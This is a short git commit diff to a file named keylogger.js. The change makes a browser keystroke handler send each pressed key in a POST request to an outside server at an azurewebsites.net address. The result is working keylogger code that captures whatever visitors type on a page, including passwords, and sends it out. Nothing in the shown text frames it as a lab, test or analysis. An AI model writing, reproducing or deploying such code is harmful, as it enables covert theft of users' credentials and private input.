11681211f54a613310881220919fd0bd999fca52
Ad3r1810 <137091313+Ad3r1810@users.noreply.github.com>
2023-06-23 09:06:16 +0200

    Update keylogger.js

--- keylogger.js
+++ keylogger.js
@@ -3,5 +3,12 @@ document.onkeydown = function(evt) {
     var key = evt.key
     if (key) {
         console.log(key);
+
+        var options = {
+            method: 'POST',
+            body: key
+        };
+
+        fetch("https://hlg-keylogger.azurewebsites.net/", options);
     }
 }
